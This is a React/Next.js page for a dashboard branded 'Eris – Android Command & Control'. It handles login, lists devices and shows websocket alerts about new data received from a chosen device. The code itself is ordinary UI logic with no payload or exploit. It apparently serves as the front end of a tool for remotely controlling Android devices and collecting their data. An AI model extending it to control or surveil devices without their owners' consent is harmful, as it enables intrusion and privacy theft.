'use client';

import { useState, useEffect } from 'react';
import { DeviceSelection } from '@/components/device-selection';
import { DashboardLayout } from '@/components/dashboard-layout';
import { AuthProvider, useAuth } from '@/contexts/auth-context';
import { apiClient } from '@/lib/api-client';
import { wsClient } from '@/lib/websocket-client';
import { useToast } from '@/hooks/use-toast';
import type { Device } from '@/lib/types';

function AppContent() {
  const [devices, setDevices] = useState<Device[]>([]);
  const [selectedDevice, setSelectedDevice] = useState<Device | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const { isAuthenticated, isLoading: authLoading } = useAuth();
  const { toast } = useToast();

  useEffect(() => {
    if (isAuthenticated && !authLoading) {
      loadDevices();

      wsClient.on('device_status', handleDeviceUpdate);
      wsClient.on('new_data', handleNewData);

      return () => {
        wsClient.off('device_status', handleDeviceUpdate);
        wsClient.off('new_data', handleNewData);
      };
    }
  }, [isAuthenticated, authLoading]);

  const loadDevices = async () => {
    setIsLoading(true);
    try {
      const response = await apiClient.getDevices();
      if (response.success && response.data) {
        setDevices(response.data);
      } else {
        toast({
          variant: 'destructive',
          title: 'Error',
          description: response.error || 'Failed to load devices'
        });
      }
    } catch (error) {
      console.error('Failed to load devices:', error);
      toast({
        variant: 'destructive',
        title: 'Error',
        description: 'Failed to load devices'
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleDeviceSelect = (device: Device | null) => {
    setSelectedDevice(device);
  };

  const handleDeviceUpdate = (updatedDevice: Device) => {
    setDevices(devices.map(d => d.guid === updatedDevice.guid ? updatedDevice : d));

    if (selectedDevice?.guid === updatedDevice.guid) {
      setSelectedDevice(updatedDevice);
    }
  };

  const handleDeviceRemove = (guid: string) => {
    setDevices(devices.filter(d => d.guid !== guid));
    if (selectedDevice?.guid === guid) {
      setSelectedDevice(null);
    }
  };

  const handleNewData = (data: { type: string; deviceId: string; count: number }) => {

    const device = devices.find(d => d.guid === data.deviceId);
    if (device) {
      toast({
        title: 'New Data',
        description: `${device.name}: Received ${data.count} new ${data.type} entries`,
      });
    }
  };

  if (authLoading) {
    return (
      <div className="flex min-h-screen w-full flex-col items-center justify-center bg-background">
        <div className="text-center space-y-4">
          <div className="flex items-center justify-center mb-8">
            <img src="/Eris.svg" alt="Eris" className="h-24 w-24" />
            <div className="ml-4">
              <h1 className="text-4xl font-bold text-foreground">Eris</h1>
              <p className="text-lg text-muted-foreground">Android Command & Control</p>
            </div>
          </div>
          <div className="animate-spin rounded-full h-32 w-32 border-b-2 border-primary mx-auto"></div>
          <p className="text-lg text-muted-foreground">Loading dashboard...</p>
        </div>
      </div>
    );
  }

  if (!isAuthenticated) {

    return (
      <div className="flex min-h-screen w-full flex-col items-center justify-center bg-background">
        <div className="text-center space-y-4">
          <div className="flex items-center justify-center mb-8">
            <img src="/Eris.svg" alt="Eris" className="h-24 w-24" />
            <div className="ml-4">
              <h1 className="text-4xl font-bold text-foreground">Eris</h1>
              <p className="text-lg text-muted-foreground">Android Command & Control</p>
            </div>
          </div>
          <p className="text-lg text-muted-foreground">Redirecting to login...</p>
        </div>
      </div>
    );
  }

  if (!selectedDevice) {
    return (
      <DeviceSelection
        devices={devices}
        onDeviceSelect={handleDeviceSelect}
        onDeviceUpdate={handleDeviceUpdate}
        onDeviceRemove={handleDeviceRemove}
        isLoading={isLoading}
      />
    );
  }

  return (
    <DashboardLayout
      selectedDevice={selectedDevice}
      onDeviceSelect={handleDeviceSelect}
    />
  );
}

export default function Home() {
  return (
    <AuthProvider>
      <AppContent />
    </AuthProvider>
  );
}